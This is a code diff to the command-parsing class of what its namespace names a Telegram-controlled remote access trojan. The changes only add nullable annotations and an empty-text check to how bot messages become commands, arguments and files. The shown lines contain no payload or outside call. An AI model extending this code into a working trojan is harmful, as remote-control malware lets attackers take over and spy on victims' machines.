@@ -1,4 +1,4 @@
-﻿using Telegram.Bot.Types.Enums;
+using Telegram.Bot.Types.Enums;
 using Telegram.Bot.Types;
 using System.Text;
 
@@ -7,19 +7,19 @@ namespace TelegramRAT.Commands;
 public class BotCommandModel
 {
     public FileBase[] Files { get; init; } = Array.Empty<FileBase>();
-    public string Filename { get; init; }
-    public Message Message { get; init; }
-    public string RawArgs { get; init; }
-    public string Command { get; set; }
+    public string? Filename { get; init; }
+    public Message? Message { get; init; }
+    public string? RawArgs { get; init; }
+    public string? Command { get; set; }
     public string[] Args { get; init; } = Array.Empty<string>();
 
-    public static BotCommandModel FromMessage(Message message, string customCommandMarker = null)
+    public static BotCommandModel? FromMessage(Message message, string? customCommandMarker = null)
     {
         if (message?.Text == null && message?.Caption == null)
             return null;
 
-        string text = message.Type == MessageType.Text ? message.Text : message.Caption;
-        if (!text.StartsWith('/') && (customCommandMarker == null || !text.StartsWith(customCommandMarker)))
+        string? text = message.Type == MessageType.Text ? message.Text : message.Caption;
+        if (string.IsNullOrEmpty(text) || (!text.StartsWith('/') && (customCommandMarker == null || !text.StartsWith(customCommandMarker))))
             return null;
 
         string marker = customCommandMarker ?? "/";
@@ -32,7 +32,7 @@ public class BotCommandModel
         var args = ParseArgs(rawArgs);
 
         var files = new List<FileBase>();
-        string filename = null;
+        string? filename = null;
 
         if (message.ReplyToMessage != null)
         {
